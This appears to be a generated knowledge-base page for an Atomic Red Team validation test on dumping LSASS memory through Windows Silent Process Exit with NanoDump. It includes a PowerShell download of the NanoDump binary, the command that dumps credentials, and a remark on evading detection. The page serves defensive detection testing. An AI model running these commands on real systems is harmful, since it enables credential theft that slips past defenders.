---
atomic_guid: "eb5adf16-b601-4926-bca7-dad22adffb37"
title: "Dump LSASS.exe Memory through Silent Process Exit"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-27 19:12:25"
executor: "command_prompt"
aliases:
  - "eb5adf16-b601-4926-bca7-dad22adffb37"
  - "Dump LSASS.exe Memory through Silent Process Exit"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a 
memory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism 
introduced in Windows 7 called Silent Process Exit, which provides the ability to trigger
specific actions for a monitored process in one of two scenarios; either the process terminates
itself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. 
The major advantage of this technique is that it does not cause lsass.exe to crash, and since 
WerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides 
the added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, 
from an attacker standpoint this is appealing as their illicit credential extraction will 
appear benign because from a defender’s viewpoint it’s within the realm of normal activity.

Upon successful execution, you should find the dump file in directory of your choice or "%temp%\SilentProcessExit" by default.

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003001-lsass-memory|T1003.001: LSASS Memory]]

## Input Arguments

### output_folder

- description: Folder Path where resulting dump should be placed
- type: path
- default: %temp%\SilentProcessExit

## Dependencies

NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)

### Prerequisite Check

```powershell
if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit "#{output_folder}"
```

### Cleanup

```cmd
rmdir "#{output_folder}" /s /q >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
